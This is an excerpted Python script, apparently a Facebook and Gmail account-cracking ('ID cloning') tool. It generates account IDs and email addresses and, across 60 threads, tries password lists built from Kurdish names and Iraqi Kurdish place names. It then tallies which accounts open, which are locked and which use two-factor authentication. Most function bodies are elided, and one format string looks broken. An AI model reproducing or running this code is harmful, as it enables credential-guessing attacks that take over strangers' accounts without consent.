...
def _pornhub_():
    ...
    print(f'{M}╚══[•] VERSION   : {H}INFINITY')
    print(" ")
    print(f"{M}╔══[{H}1{M}] {GREEN}RANDOM IRAQ BD ID CLONING{RED} (CHOICE) ")
    print(f"║══[{H}2{M}] {M}RANDOM IRAQ CLONING{RED} (CHOICE) ")
...
def shbd():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('57273200'), ('hama123'), ('hama1234'), ('hamahama'), ('hama12345'), ('hama11'), ('hama1122'), ('hama112233'), ('qaladza123'), ('qaladzaqaladza'), ('qaladza1234'), ('qaladza12345')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('57273200'), ('halwest123'), ('halwest1234'), ('halwest12345'), ('halwest11'), ('halwest1122'), ('halwest112233'), ('ranya123'), ('ranyaranya'), ('ranya1234'), ('ranya12345'), ('ranya123456')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('57273200'), ('harde123'), ('harde1234'), ('harde12345'), ('harde11'), ('harde1122'), ('harde112233'), ('hajyawa123'), ('hajyawahajyawa'), ('hajyawa1234'), ('hajyawa12345'), ('hajyawa123456')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('57273200'), ('ibrahim123'), ('ibrahim1234'), ('ibrahim12345'), ('ibrahim11'), ('ibrahim1122'), ('ibrahim112233'), ('sangasar123'), ('sangasarsangasar'), ('sangasar1234'), ('sangasar12345'), ('sangasar123456')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('57273200'), ('sardam123'), ('sardam1234'), ('sardam12345'), ('sardam11'), ('sardam1122'), ('sardam112233'), ('chwarqurna123'), ('chwarqurnachwarqurna'), ('chwarqurna1234'), ('chwarqurna12345'), ('chwarqurna123456')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('57273200'), ('ramyar123'), ('ramyar1234'), ('ramyar12345'), ('ramyar11'), ('ramyar1122'), ('ramyar112233'), ('chamchamall123'), ('chamchamallchamchamall'), ('chamchamall123'), ('chamchamall1234'), ('chamchamall12345')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('57273200'), ('hevar123'), ('hevar1234'), ('hevar12345'), ('hevar11'), ('hevar1122'), ('hevar112233'), ('hawler123'), ('hawlerhawler'), ('hawler1234'), ('hawler12345'), ('hawler123456')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('57273200'), ('ahmad123'), ('ahmad1234'), ('ahmad12345'), ('ahmad11'), ('ahmad1122'), ('ahmad112233'), ('zaxo123'), ('zaxozaxo'), ('zaxo1234'), ('zaxo12345'), ('zaxo123456')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('57273200'), ('mahamad123'), ('mahamad1234'), ('mahamad12345'), ('mahamad11'), ('mahamad1122'), ('mahamad112233'), ('slemani123'), ('slemanislemani'), ('slemani1234'), ('slemani12345'), ('slemani123456')])
            if pom =='1':
...
def gmail():
    ...
    print(f"                 {H} GMAIL {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}@gmail.com{P}][{B}@hotmail.com{P}][{K}@yahoo.com{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    kk = input(f' CHOOSE :{H} ')
    pp = kk.lower()
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            ...
            pwx = ([(gg+"."+nn+love), (gg+nn+love), (gg+" 123"), (nn+" 1234"), (nn+" 12345"), (nn+" 123456"), (nn+nn), (nn+" 12"), (nn+" 1122"), (nn+" 112233"), (nn+" 2000"), (nn+" 1000"), ])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            shanto = random.choice(["\x1b[1;91mMR,VEAR","\x1b[1;92mMR,VEAR","\x1b[1;93mMR,VEAR","\x1b[1;94mMR,VEAR","\x1b[1;95mMR,VEAR","\x1b[1;96mMR,VEAR","\x1b[1;97mMR,VEAR","\x1b[1;91mMR,VEAR","\x1b[1;92mMR,VEAR","\x1b[1;93mMR,VEAR","\x1b[1;94mMR,VEAR","\x1b[1;95mMR,VEAR","\x1b[1;96mMR,VEAR"])
            sys.stdout.write(f'\r    {P}[{MR,VEAR}{P}][{K}%s{P}/{B}%s{P}][{H}OK{P}/{M}LOK{P}/{B}2F{P}]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok),len(lok),len(twf))),
            sys.stdout.flush()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91mMR,VEAR","\x1b[1;92mMR,VEAR","\x1b[1;93mMR,VEAR","\x1b[1;94mMR,VEAR","\x1b[1;95mMR,VEAR","\x1b[1;96mMR,VEAR","\x1b[1;97mMR,VEAR","\x1b[1;91mMR,VEAR","\x1b[1;92mMR,VEAR","\x1b[1;93mMR,VEAR","\x1b[1;94mMR,VEAR","\x1b[1;95mMR,VEAR","\x1b[1;96mMR,VEAR"])
